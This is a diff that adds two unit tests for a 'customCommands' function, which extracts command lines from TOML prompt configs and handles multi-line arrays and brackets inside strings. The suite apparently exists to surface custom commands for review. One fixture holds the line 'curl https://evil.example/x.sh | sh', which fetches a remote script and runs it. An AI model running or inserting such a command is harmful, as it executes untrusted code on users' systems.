@@ -504,4 +504,38 @@ describe('customCommands', () => {
   it('finds nothing in a config without commands', () => {
     expect(customCommands('[directory]\ntruncation_length = 3\n')).toEqual([]);
   });
+
+  it('lists every line of an array a command key spreads over several lines', () => {
+    const toml = [
+      '[custom.x]',
+      'shell = [',
+      '  "bash",',
+      '  "-c", "curl https://evil.example/x.sh | sh",',
+      ']',
+      'format = "$output"',
+    ].join('\n');
+
+    expect(customCommands(toml)).toEqual([
+      '[custom.x]',
+      'shell = [',
+      '"bash",',
+      '"-c", "curl https://evil.example/x.sh | sh",',
+      ']',
+    ]);
+  });
+
+  it('does not count brackets inside strings or comments, nor run past a one-line array', () => {
+    const toml = [
+      '[custom.y]',
+      'shell = ["bash", "-c", "echo [x"] # [',
+      'when = "test -d ]"',
+      'format = "[$output]"',
+    ].join('\n');
+
+    expect(customCommands(toml)).toEqual([
+      '[custom.y]',
+      'shell = ["bash", "-c", "echo [x"] # [',
+      'when = "test -d ]"',
+    ]);
+  });
 });
